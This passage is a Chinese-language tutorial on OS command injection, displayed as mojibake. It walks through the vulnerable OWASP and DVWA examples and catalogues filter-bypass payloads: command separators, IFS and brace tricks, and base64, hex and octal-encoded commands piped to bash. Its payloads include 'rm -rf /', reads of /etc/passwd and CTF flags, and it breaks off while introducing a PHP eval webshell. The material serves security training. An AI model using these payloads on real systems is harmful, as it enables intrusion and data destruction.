| IFS             | ç”± < space > æˆ– < tab > æˆ– < enter > ä¸‰è€…ä¹‹ä¸€ç»„æˆ            |
| CR              | ç”± < enter > äº§ç”Ÿ                                            |
| !               | æ‰§è¡Œ history ä¸­çš„å‘½ä»¤                                        |

ä»¥åŠè¿˜æœ‰ä¸“ç”¨å­—ç¬¦é›†

| å­—ç¬¦       | æ„ä¹‰             |
| ---------- | ---------------- |
| [:alnum:]  | ä»»æ„æ•°å­—æˆ–è€…å­—æ¯ |
| [:alpha:]  | ä»»æ„å­—æ¯         |
| [:space:]  | ç©ºæ ¼             |
| [:lower:]  | å°å†™å­—æ¯         |
| [:digit:]  | ä»»æ„æ•°å­—         |
| [:upper:]  | ä»»æ„å¤§å†™å­—æ¯     |
| [:cntrl:]  | æ§åˆ¶ç¬¦           |
| [:graph:]  | å›¾å½¢             |
| [:print:]  | å¯æ‰“å°å­—ç¬¦       |
| [:punct:]  | æ ‡ç‚¹ç¬¦å·         |
| [:xdigit:] | åå…­è¿›åˆ¶æ•°       |
| [:blank:]  | ç©ºç™½å­—ç¬¦         |

- åœ¨ä½¿ç”¨ä¸“å±å­—ç¬¦é›†çš„æ—¶å€™ï¼Œå­—ç¬¦é›†ä¹‹å¤–è¿˜éœ€è¦ç”¨ [ ] æ¥åŒ…å«ä½ï¼Œå¦åˆ™ä¸“ç”¨å­—ç¬¦é›†ä¸ä¼šç”Ÿæ•ˆï¼Œä¾‹å¦‚`[[:space:]]`
- æƒ³è¦è½¬ä¹‰çš„æ—¶å€™ï¼Œå•å¼•å·ä¸åŒå¼•å·ä½¿ç”¨æ–¹æ³•æ˜¯ä¸åŒçš„ï¼Œå•å¼•å·ä¼šè½¬ä¹‰æ‰€æœ‰å­—ç¬¦ï¼Œè€Œä¸”å•å¼•å·ä¸­é—´ä¸å…è®¸å†å‡ºç°å•å¼•å·ï¼ŒåŒå¼•å·å…è®¸å‡ºç°ç‰¹å®šçš„ shell å…ƒå­—ç¬¦ï¼Œå…·ä½“å­—ç¬¦å¯ä»¥è‡ªè¡ŒæŸ¥è¯¢
- åœ¨ä½¿ç”¨èŠ±æ‹¬å· {} çš„æ—¶å€™ï¼Œé‡Œé¢çš„å•ä¸ªå­—ç¬¦ä¸²éœ€è¦ä½¿ç”¨å•å¼•å·æˆ–è€…åŒå¼•å·æ‹¬ä½ï¼Œå¦åˆ™å°±ä¼šè§†ä¸ºå¤šä¸ªçš„å•ä¸ªå­—ç¬¦



### ä¸¾ä¸ªğŸŒ°

ä»¥ä¸‹äº‹ä¾‹Example 1-6æ¥æºäº`OWASP`

#### Example 1

ä»¥ä¸‹ä»£ç æ˜¯UNIXå‘½ä»¤`cat`çš„åŒ…è£…å™¨ï¼Œå®ƒå°†æ–‡ä»¶çš„å†…å®¹æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºã€‚ å®ƒä¹Ÿæ˜¯å¯ä»¥è¢«æ³¨å…¥çš„ï¼š

```c
#include <stdio.h>
#include <unistd.h>

int main(int argc, char **argv) {
    char cat[] = "cat ";
    char *command;
    size_t commandLength;

    commandLength = strlen(cat) + strlen(argv[1]) + 1;
    command = (char *) malloc(commandLength);
    strncpy(command, cat, commandLength);
    strncat(command, argv[1], (commandLength - strlen(cat)) );

    system(command);
    return (0);
}
```

æˆ‘ä»¬ç¼–è¯‘å®Œä¹‹åå¯ä»¥é€šè¿‡ä»¥ä¸‹æ“ä½œæ­£å¸¸ä½¿ç”¨

```bash
$ ./catWrapper Story.txt
When last we left our heroes...
```

ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬åœ¨è¿™è¡Œçš„æœ«å°¾ä¹‹ååŠ ä¸€ä¸ª`;`å’Œå¦ä¸€ä¸ªå‘½ä»¤ï¼Œé‚£ä¹ˆå‘½ä»¤`catWrapper`æ‰§è¡Œè€Œä¸”ä¹Ÿä¸ä¼šå‡ºé”™ã€‚

```bash
$ ./catWrapper "Story.txt; ls"
When last we left our heroes...
Story.txt               doubFree.c              nullpointer.c
unstosig.c              www*                    a.out*
format.c                strlen.c                useFree*
catWrapper*             misnull.c               strlength.c             useFree.c
commandinjection.c      nodefault.c             trunc.c                 writeWhatWhere.c
```

å¦‚æœå°†`catWrapper`è®¾ç½®ä¸ºå…·æœ‰æ¯”æ ‡å‡†ç”¨æˆ·æ›´é«˜çš„æƒé™çº§åˆ«ï¼Œåˆ™å¯ä»¥ä½¿ç”¨è¯¥æ›´é«˜æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚



#### Example 2

ä»¥ä¸‹ç®€å•ç¨‹åºæ¥å—æ–‡ä»¶åä½œä¸ºå‘½ä»¤è¡Œå‚æ•°ï¼Œå¹¶å°†æ–‡ä»¶çš„å†…å®¹æ˜¾ç¤ºç»™ç”¨æˆ·ã€‚ è¯¥ç¨‹åºå®‰è£…äº†`setuid root`ï¼Œå‡è®¾åŸæœ¬å®ƒæ—¨åœ¨ç”¨ä½œå­¦ä¹ å·¥å…·ï¼Œå…è®¸ç³»ç»Ÿç®¡ç†å‘˜åœ¨åŸ¹è®­ä¸­æ£€æŸ¥ç‰¹æƒç³»ç»Ÿæ–‡ä»¶ï¼Œè€Œä¸ä¼šè®©ä»–ä»¬ä¿®æ”¹å®ƒä»¬æˆ–æŸåç³»ç»Ÿã€‚

```c
int main(char* argc, char** argv) {
    char cmd[CMD_MAX] = "/usr/bin/cat ";
    strcat(cmd, argv[1]);
    system(cmd);
}
```

ç”±äºç¨‹åºä»¥`root`æƒé™è¿è¡Œï¼Œå› æ­¤å¯¹`system()`çš„è°ƒç”¨ä¹Ÿä»¥`root`æƒé™æ‰§è¡Œã€‚ å¦‚æœç”¨æˆ·æŒ‡å®šæ ‡å‡†æ–‡ä»¶åï¼Œåˆ™ç¨‹åºè°ƒç”¨ä¼šæŒ‰é¢„æœŸå·¥ä½œã€‚ ä½†æ˜¯ï¼Œå¦‚æœæ”»å‡»è€…ä¼ é€’`1; rm -rf /`å½¢å¼çš„å­—ç¬¦ä¸²ï¼Œæ— è®ºå½“å‰ç›®å½•æ˜¯å¦æœ‰`1`è¿™ä¸ªæ–‡ä»¶ï¼Œéƒ½ä¼šç»§ç»­å‘ä¸‹æ‰§è¡Œ`rm -rf /`ã€‚



#### Example 3

æœ¬ä¾‹ä¸­ï¼Œæœ¬ç¨‹åºæ‹¥æœ‰å¯¹åº”çš„æƒé™ï¼Œä½¿ç”¨ç¯å¢ƒå˜é‡`$APPHOME`æ¥ç¡®å®šåº”ç”¨ç¨‹åºçš„å®‰è£…ç›®å½•ï¼Œç„¶ååœ¨è¯¥ç›®å½•ä¸­æ‰§è¡Œåˆå§‹åŒ–è„šæœ¬

```c
char* home=getenv("APPHOME");
char* cmd=(char*)malloc(strlen(home)+strlen(INITCMD));
if (cmd) {
    strcpy(cmd,home);
    strcat(cmd,INITCMD);
    execl(cmd, NULL);
}
```

æœ¬ä¾‹å‰æä¸`Example 2`ä¸­ä¸€æ ·ï¼Œæ­¤ç¤ºä¾‹ä¸­çš„ä»£ç å…è®¸æ”»å‡»è€…ä½¿ç”¨åº”ç”¨ç¨‹åºçš„æå‡æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥ä¿®æ”¹ç¯å¢ƒå˜é‡`$APPHOME`é€šè¿‡åˆ¶å®šä¸åŒçš„è·¯å¾„ä»¥ä½¿ç”¨å«æœ‰æ¶æ„ä»£ç çš„`INITCMD`ã€‚ ç”±äºç¨‹åºä¸éªŒè¯ä»`getenv()`è¯»å–çš„å€¼ï¼Œå› æ­¤é€šè¿‡æ§åˆ¶ç¯å¢ƒå˜é‡ï¼Œæ”»å‡»è€…å¯ä»¥æ¬ºéª—åº”ç”¨ç¨‹åºè¿è¡Œæ¶æ„ä»£ç ã€‚

æ”»å‡»è€…ä½¿ç”¨ç¯å¢ƒå˜é‡æ¥æ§åˆ¶ç¨‹åºè°ƒç”¨çš„å‘½ä»¤ï¼Œå› æ­¤åœ¨æ­¤ç¤ºä¾‹ä¸­ç¯å¢ƒå˜é‡çš„å½±å“æ˜¯éå¸¸å·¨å¤§çš„ã€‚



#### Example 4

ä¸‹é¢çš„ä»£ç æ¥è‡ªåŸºäº`Web`çš„`CGI`å®ç”¨ç¨‹åºï¼Œå…è®¸ç”¨æˆ·æ›´æ”¹å…¶å¯†ç ã€‚ NISä¸‹çš„å¯†ç æ›´æ–°è¿‡ç¨‹åŒ…æ‹¬åœ¨`/var/yp`ç›®å½•ä¸­è¿è¡Œ`make`ã€‚ è¯·æ³¨æ„ï¼Œç”±äºç¨‹åºæ›´æ–°å¯†ç è®°å½•ï¼Œå› æ­¤å·²å®‰è£…`setuid root`ã€‚å‡½æ•°å¯¹`make`è°ƒç”¨å¦‚ä¸‹ï¼š

```c
 system("cd /var/yp && make &> /dev/null");
```

ä¸å‰é¢çš„ç¤ºä¾‹ä¸åŒï¼Œæ­¤ç¤ºä¾‹ä¸­çš„å‘½ä»¤æ˜¯æ²¡æœ‰å¯æ§è¾“å…¥çš„ç¡¬ç¼–ç ï¼Œå› æ­¤æ”»å‡»è€…æ— æ³•æ§åˆ¶ä¼ é€’ç»™`system()`çš„å‚æ•°ã€‚ä½†æ˜¯ï¼Œç”±äºç¨‹åºæ²¡æœ‰ä¸ºmakeæŒ‡å®šç»å¯¹è·¯å¾„ï¼Œå¹¶ä¸”åœ¨è°ƒç”¨å‘½ä»¤ä¹‹å‰æ²¡æœ‰æ“¦é™¤ä»»ä½•ç¯å¢ƒå˜é‡ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥ä¿®æ”¹å…¶`$PATH`å˜é‡ä»¥æŒ‡å‘åä¸º`make`çš„æ¶æ„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶ä»ä¸­æ‰§è¡Œ`CGI`è„šæœ¬ã€‚`shell`æç¤ºã€‚ç”±äºè¯¥ç¨‹åºå·²ç»å®‰è£…äº†`setuid root`ï¼Œå› æ­¤æ”»å‡»è€…çš„`make`ç‰ˆæœ¬ç°åœ¨ä»¥`root`æƒé™è¿è¡Œã€‚

ç¯å¢ƒåœ¨ç¨‹åºä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ–¹é¢å‘æŒ¥ç€é‡è¦ä½œç”¨ã€‚`system()`å’Œ`exec()`ä¹‹ç±»çš„å‡½æ•°ä½¿ç”¨è°ƒç”¨å®ƒä»¬çš„ç¨‹åºç¯å¢ƒï¼Œå› æ­¤æ”»å‡»è€…æœ‰å¯èƒ½å½±å“è¿™äº›è°ƒç”¨çš„è¡Œä¸ºã€‚

æœ‰å¾ˆå¤šæ–‡ç« ä¼šæåˆ°`Java`çš„`Runtime.exec`ä¸`C`çš„ç³»ç»ŸåŠŸèƒ½å®Œå…¨ç›¸åŒã€‚å…¶å®ä¸ç„¶ã€‚è™½ç„¶ä¸¤è€…éƒ½å…è®¸è°ƒç”¨æ–°çš„ç¨‹åº/è¿›ç¨‹ï¼Œä½†æ˜¯ï¼Œ`C`çš„ç³»ç»Ÿå‡½æ•°å°†å…¶å‚æ•°ä¼ é€’ç»™è¦è§£æçš„`shell(/bin/sh)`ï¼Œè€Œ`Runtime.exec`å°è¯•å°†å­—ç¬¦ä¸²æ‹†åˆ†ä¸ºå•è¯æ•°ç»„ï¼Œç„¶åä½¿ç”¨å…¶ä½™å•è¯æ‰§è¡Œæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå•è¯ä½œä¸ºå‚æ•°ã€‚`Runtime.exec`ä¸ä¼šå°è¯•åœ¨ä»»ä½•æ—¶å€™è°ƒç”¨`shell`ã€‚å…³é”®çš„åŒºåˆ«åœ¨äº`shell`æä¾›çš„å¤§éƒ¨åˆ†åŠŸèƒ½å¯è¢«æ¶æ„åˆ©ç”¨çš„ç‚¹ï¼ˆä¾‹å¦‚`ï¼†`ï¼Œ`&&`ï¼Œ`|`ï¼Œ`||`ç­‰é“¾æ¥å‘½ä»¤ï¼Œé‡å®šå‘è¾“å…¥å’Œè¾“å‡ºï¼‰å°†ç®€å•åœ°ç»“æŸä½œä¸ºä¼ é€’ç»™ç¬¬ä¸€ä¸ªå‘½ä»¤çš„å‚æ•°ï¼Œå¯èƒ½å¯¼è‡´è¯­æ³•é”™è¯¯ï¼Œæˆ–è¢«æŠ›å‡ºä½œä¸ºæ— æ•ˆå‚æ•°ã€‚



#### Example 5

ä»¥ä¸‹ç®€å•çš„ä»£ç ç‰‡æ®µæ˜“å—`Unix/Linux`å¹³å°ä¸Šçš„OSå‘½ä»¤æ³¨å…¥æ”»å‡»ï¼š

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
     char command[256];

     if(argc != 2) {
          printf("Error: Please enter a program to time!\n");
          return -1;
     }

     memset(&command, 0, sizeof(command));

     strcat(command, "time ./");
     strcat(command, argv[1]);

     system(command);
     return 0;
}
```

å¦‚æœè¿™æ˜¯ä¸€ä¸ª`suid`äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¯·è€ƒè™‘æ”»å‡»è€…è¾“å…¥ä»¥ä¸‹å†…å®¹çš„æƒ…å†µ:`ls; cat /etc/passwd`ã€‚ åœ¨Unixç¯å¢ƒä¸­ï¼Œ`shell`å‘½ä»¤ç”¨åˆ†å·åˆ†éš”ã€‚ æˆ‘ä»¬ç°åœ¨å¯ä»¥éšæ„æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼



#### Example 6

```php
<?php
    print("Please specify the name of the file to delete");
    print("<p>");
    $file=$_GET['filename'];
    system("rm $file");
?>
```

ä»¥ä¸‹æˆåŠŸæ”»å‡»çš„ç¤ºä¾‹ï¼š

Request:

```url
http://127.0.0.1/delete.php?filename=bob.txt;id
```

Response:

```
Please specify the name of the file to delete

uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```



###	å†ä¸¾ä¸ªğŸŒ°

####	?çš„ä½¿ç”¨

```bash
$ cat /fl??
NUAACTF{56723419231}

$ cat /???/??ss
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
_apt:x:102:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:103:107:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
```

####	[...]çš„ä½¿ç”¨

`[...]`åŒ¹é…æ–¹æ‹¬å·ä¹‹ä¸­çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ï¼Œæ¯”å¦‚`[aeiou]`å¯ä»¥åŒ¹é…äº”ä¸ªå…ƒéŸ³å­—æ¯ã€‚

```bash
# å­˜åœ¨æ–‡ä»¶ a.txt å’Œ b.txt å’Œ c.txt å’Œ ab.txt
$ ls [ab].txt
a.txt b.txt

$ ls *[ab].txt
ab.txt a.txt b.txt

$ ls [a-c].txt
a.txt b.txt c.txt

$ ls *[a-c].txt
a.txt ab.txt abc.txt b.txt c.txt
```

####	{...}çš„ä½¿ç”¨

`{...}` è¡¨ç¤ºåŒ¹é…å¤§æ‹¬å·é‡Œé¢çš„æ‰€æœ‰æ¨¡å¼ï¼Œæ¨¡å¼ä¹‹é—´ä½¿ç”¨é€—å·åˆ†éš”ã€‚

```BASH
$ echo d{a,e,i,u,o}g
dag deg dig dug dog

#	å¤§æ‹¬å·å¯ä»¥åµŒå¥—ä½¿ç”¨
$ echo {j{p,pe}g,png}
jpg jpeg png

#	{start..end}åŒ¹é…è¿ç»­å­—ç¬¦
$ cat /f{0..z}ag
NUAACTF{56723419231}
```

`{...}`ä¸`[...]`æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„åŒºåˆ«ã€‚å¦‚æœåŒ¹é…çš„æ–‡ä»¶ä¸å­˜åœ¨ï¼Œ`[...]`ä¼šå¤±å»æ¨¡å¼çš„åŠŸèƒ½ï¼Œå˜æˆä¸€ä¸ªå•çº¯çš„å­—ç¬¦ä¸²ï¼Œè€Œ`{...}`ä¾ç„¶å¯ä»¥å±•å¼€ã€‚

```bash
# ä¸å­˜åœ¨ a.txt å’Œ b.txt
$ ls [ab].txt
ls: [ab].txt: No such file or directory

$ ls {a,b}.txt
ls: a.txt: No such file or directory
ls: b.txt: No such file or directory
```



####	Tips

åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­åº”è¯¥æ³¨æ„ï¼š

1. é€šé…ç¬¦æ˜¯å…ˆè§£é‡Šï¼Œå†æ‰§è¡Œã€‚

   Bash æ¥æ”¶åˆ°å‘½ä»¤ä»¥åï¼Œå‘ç°é‡Œé¢æœ‰é€šé…ç¬¦ï¼Œä¼šè¿›è¡Œé€šé…ç¬¦æ‰©å±•ï¼Œç„¶åå†æ‰§è¡Œå‘½ä»¤ã€‚

   ```bash
   $ ls a*.txt
   ab.txt
   
   #	ä¸Šé¢å‘½ä»¤çš„æ‰§è¡Œè¿‡ç¨‹æ˜¯ï¼ŒBash å…ˆå°†a*.txtæ‰©å±•æˆab.txtï¼Œç„¶åå†æ‰§è¡Œls ab.txtã€‚
   ```

2. é€šé…ç¬¦ä¸åŒ¹é…ï¼Œä¼šåŸæ ·è¾“å‡ºã€‚

   Bash æ‰©å±•é€šé…ç¬¦çš„æ—¶å€™ï¼Œå‘ç°ä¸å­˜åœ¨åŒ¹é…çš„æ–‡ä»¶ï¼Œä¼šå°†é€šé…ç¬¦åŸæ ·è¾“å‡ºã€‚

   ```bash
   $ ls *.csv
   ls: *.csv: No such file or directory
   
   #	å¦å¤–ï¼Œå‰é¢å·²ç»è¯´è¿‡ï¼Œè¿™æ¡è§„åˆ™å¯¹{...}ä¸é€‚ç”¨
   ```

3. åªé€‚ç”¨äºå•å±‚è·¯å¾„ã€‚

   ä¸Šé¢æ‰€æœ‰é€šé…ç¬¦åªåŒ¹é…å•å±‚è·¯å¾„ï¼Œä¸èƒ½è·¨ç›®å½•åŒ¹é…ï¼Œå³æ— æ³•åŒ¹é…å­ç›®å½•é‡Œé¢çš„æ–‡ä»¶ã€‚æˆ–è€…è¯´ï¼Œ`?`æˆ–`*`è¿™æ ·çš„é€šé…ç¬¦ï¼Œä¸èƒ½åŒ¹é…è·¯å¾„åˆ†éš”ç¬¦ï¼ˆ`/`ï¼‰ã€‚

   å¦‚æœè¦åŒ¹é…å­ç›®å½•é‡Œé¢çš„æ–‡ä»¶ï¼Œå¯ä»¥å†™æˆä¸‹é¢è¿™æ ·ã€‚

   ```bash
   $ ls */*.txt
   ```

4. å¯ç”¨äºæ–‡ä»¶åã€‚

   Bash å…è®¸æ–‡ä»¶åä½¿ç”¨é€šé…ç¬¦ã€‚è¿™æ—¶ï¼Œå¼•ç”¨æ–‡ä»¶åçš„æ—¶å€™ï¼Œéœ€è¦æŠŠæ–‡ä»¶åæ”¾åœ¨å•å¼•å·é‡Œé¢ã€‚

   ```bash
   $ touch 'fo*'
   $ ls
   fo*
   
   #	ä¸Šé¢ä»£ç åˆ›å»ºäº†ä¸€ä¸ªfo*æ–‡ä»¶ï¼Œè¿™æ—¶*å°±æ˜¯æ–‡ä»¶åçš„ä¸€éƒ¨åˆ†ã€‚
   ```




###	è¿ç”¨

ä»¥`DVWA`ä¸ºä¾‹

####	Command Injection: low

```php
<?php 

if( isset( $_POST[ 'Submit' ]  ) ) { 
    // Get input 
    $target = $_REQUEST[ 'ip' ]; 

    // Determine OS and execute the ping command. 
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 
        // Windows 
        $cmd = shell_exec( 'ping  ' . $target ); 
    } 
    else { 
        // *nix 
        $cmd = shell_exec( 'ping  -c 4 ' . $target ); 
    } 

    // Feedback for the end user 
    echo "<pre>{$cmd}</pre>"; 
} 

?> 
```

è¿™é‡Œæ²¡æœ‰å¯¹`ip`è¿›è¡Œè¾“å…¥æ£€æµ‹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨`;cmd`çš„æ–¹å¼è¿›è¡Œå‘½ä»¤æ³¨å…¥ã€‚

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fykpgyazsuj213i0x6491.jpg)



####Command Injection: medium

```php
<?php 

if( isset( $_POST[ 'Submit' ]  ) ) { 
    // Get input 
    $target = $_REQUEST[ 'ip' ]; 

    // Set blacklist 
    $substitutions = array( 
        '&&' => '', 
        ';'  => '', 
    ); 

    // Remove any of the charactars in the array (blacklist). 
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 

    // Determine OS and execute the ping command. 
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 
        // Windows 
        $cmd = shell_exec( 'ping  ' . $target ); 
    } 
    else { 
        // *nix 
        $cmd = shell_exec( 'ping  -c 4 ' . $target ); 
    } 

    // Feedback for the end user 
    echo "<pre>{$cmd}</pre>"; 
} 

?> 
```

è¿™é‡Œä»…ä»…åªæ˜¯å¢åŠ äº†`&&`ä¸`;`ä¸¤ä¸ªçš„è¿‡æ»¤ã€‚ç„¶è€Œæˆ‘ä»¬ä»ç„¶å¯ä»¥ä½¿ç”¨`|`æ¥è¿›è¡Œç»•è¿‡ã€‚

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fykpgyazsuj213i0x6491.jpg)



####Command Injection: high

```php
<?php 

if( isset( $_POST[ 'Submit' ]  ) ) { 
    // Get input 
    $target = trim($_REQUEST[ 'ip' ]); 

    // Set blacklist 
    $substitutions = array( 
        '&'  => '', 
        ';'  => '', 
        '| ' => '', 
        '-'  => '', 
        '$'  => '', 
        '('  => '', 
        ')'  => '', 
        '`'  => '', 
        '||' => '', 
    ); 

    // Remove any of the charactars in the array (blacklist). 
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 

    // Determine OS and execute the ping command. 
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 
        // Windows 
        $cmd = shell_exec( 'ping  ' . $target ); 
    } 
    else { 
        // *nix 
        $cmd = shell_exec( 'ping  -c 4 ' . $target ); 
    } 

    // Feedback for the end user 
    echo "<pre>{$cmd}</pre>"; 
} 

?> 
```

è¿™é‡Œä»”ç»†è§‚å¯Ÿï¼Œå…¶å®`|`ç®¡é“ç¬¦è¿™é‡Œæœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œæ‰€ä»¥æˆ‘ä»¬`medium`çš„`payload`è¿˜å¯ä»¥ç»§ç»­ä½¿ç”¨ï¼Œä½†æ˜¯å¦‚æœçœŸçš„è¿‡æ»¤äº†`|`æ€ä¹ˆåŠå‘¢ã€‚æˆ‘ä»¬å…¶å®è¿˜å¯ä»¥æŠ“åŒ…åŠ å…¥`%0a`æ¢è¡Œç¬¦è¿›è¡Œä¸€ä¸ªç»•è¿‡ã€‚ä½¿ç”¨`127.0.0.1 %0acat /etc/passwd`è¿›è¡Œç»•è¿‡

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fykptasckdj21yw18saov.jpg)



#### Command Injection: impossible

```php
<?php 

if( isset( $_POST[ 'Submit' ]  ) ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 

    // Get input 
    $target = $_REQUEST[ 'ip' ]; 
    $target = stripslashes( $target ); 

    // Split the IP into 4 octects 
    $octet = explode( ".", $target ); 

    // Check IF each octet is an integer 
    if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) { 
        // If all 4 octets are int's put the IP back together. 
        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3]; 

        // Determine OS and execute the ping command. 
        if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 
            // Windows 
            $cmd = shell_exec( 'ping  ' . $target ); 
        } 
        else { 
            // *nix 
            $cmd = shell_exec( 'ping  -c 4 ' . $target ); 
        } 

        // Feedback for the end user 
        echo "<pre>{$cmd}</pre>"; 
    } 
    else { 
        // Ops. Let the user name theres a mistake 
        echo '<pre>ERROR: You have entered an invalid IP.</pre>'; 
    } 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?> 
```

è¿™é‡Œå¯¹`ip`ä»¥`.`åˆ†ç»„å¹¶æ£€æŸ¥äº†æ˜¯å¦ä¸ºæ•°å­—ï¼Œå¢åŠ äº†æ›´å¤šçš„è¿‡æ»¤ï¼Œæ‰€ä»¥æ²¡åŠæ³•ä½¿ç”¨ä¹‹å‰é‚£äº›`trick`æ¥è¿›è¡Œç»•è¿‡äº†ã€‚



###	å¸¸ç”¨ç»•è¿‡

####	å‘½ä»¤åˆ†éš”ä¸æ‰§è¡Œå¤šæ¡å‘½ä»¤

åœ¨`Unix`ä¸Š:

```
%0a
%0d 
;
&
|
$(shell_command)
`shell_command`
{shell_command,}
```

åœ¨`Windows`ä¸Šï¼š

```
%0a
&
|
%1a - ä¸€ä¸ªç¥å¥‡çš„è§’è‰²ï¼Œä½œä¸º.batæ–‡ä»¶ä¸­çš„å‘½ä»¤åˆ†éš”ç¬¦
```

ä¾‹å¦‚ï¼š

```php
<?php
$command = 'dir '.$_POST['dir'];
$escaped_command = escapeshellcmd($command);
var_dump($escaped_command);
file_put_contents('out.bat',$escaped_command);
system('out.bat');
?>
```

å¯ä»¥åˆ©ç”¨`%1a`ç»•è¿‡

```
dir=../ %1a whoami
```

æ¯”è¾ƒè€çš„`php`ç‰ˆæœ¬ï¼Œå¦‚5.2.5åŠä¹‹å‰å¯ä»¥é€šè¿‡è¾“å…¥å¤šå­—èŠ‚æ¥ç»•è¿‡ã€‚ç°åœ¨å‡ ä¹è§ä¸åˆ°äº†ã€‚

```php
escapeshellcmd("echo ".chr(0xc0).";id");

//echo ç¹º;id
```



####	ç©ºæ ¼ç»•è¿‡

1. ä½¿ç”¨`<`æˆ–è€…`<>`

   ```bash
   $ cat</flag
   flag{xxx}
   
   $ cat<>/flag
   flag{xxx}
   ```

2. ä½¿ç”¨`IFS`æˆ–è€…

   ```bash
   $ cat$IFS$9/flag
   flag{xxx}
   
   $ cat${IFS}/flag
   flag{xxx}
   
   $ cat$IFS/flag
   flag{xxx}
   ```

3. åœ¨`url`çš„ç¼–ç ç»•è¿‡

   è¿™é‡Œæˆ‘`fuzz`äº†ä¸€ä¸‹ï¼Œ`Linux bash`å¯ä»¥ä½¿ç”¨`%20(space)`ã€`%09(tab)`ã€`%3c(<)`ä»¥åŠ`+`æ¥ç»•è¿‡

   ![](https://ws1.sinaimg.cn/large/64ef14dcgy1fylfbbt1n2j21yy1964ki.jpg)

4. èŠ±æ‹¬å·æ‹“å±•`{OS_COMMAND,ARGUMENT}`

   åœ¨`Linux bash`ä¸­è¿˜å¯ä»¥ä½¿ç”¨`{cat,/etc/passwd}`æ¥ç»•è¿‡

   ![](https://ws1.sinaimg.cn/large/64ef14dcgy1fylhtmzibwj210w0lynmy.jpg)

5. å˜é‡æ§åˆ¶

   ```bash
   $ X=$'cat\x20/flag'&&$X
   flag{xxx}
   
   $ X=$'cat\x09/flag'&&$X
   flag{xxx}
   
   #è¿™é‡Œ\x3cä¸å¯ä»¥
   ```

6. é‡‡ç”¨`$@`ç»•è¿‡

   ```bash
   $ c$@at /fl$@ag
   flag{xxx}
   
   $ echo i$@d
   id
   
   $ echo i$@d|$0
   uid=0(root) gid=0(root) groups=0(root)
   ```






####	é»‘åå•ç»•è¿‡

1. é‡‡ç”¨å˜é‡

   ```bash
   $ a=l;b=s;$a$b
   bin  boot  dev	etc  home  lib	lib64  media  mnt  opt	proc  root  run  sbin  srv  sys  tmp  usr  var
   
   $ a=c;b=at;c=flag;$a$b $c
   flag{xxx}
   ```

2. ç¼–ç ç»•è¿‡

   ```bash
   $ echo "Y2F0IC9mbGFn"|base64 -d|bash
   flag{xxx}
   
   #base64_endcode("cat /flag") => Y2F0IC9mbGFn
   #base64å¯èƒ½ä¼šå‡ºç°/
   
   $ echo "636174202f666c6167" | xxd -r -p|bash	#hex
   flag{xxx}
   
   $ $(printf "\154\163")							#oct
   bin  boot  dev	etc  flag  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
   
   $ $(cat /flag)
   bash: flag{xxx}: æœªæ‰¾åˆ°å‘½ä»¤
   
   $ $(printf "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67")
   flag{xxx}
   
   $ {printf,"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"}|$0
   flag{xxx}
   
   #å¯ä»¥é€šè¿‡è¿™æ ·æ¥å†™webshell,å†…å®¹ä¸º<?php @eval($_POST['c']);?>
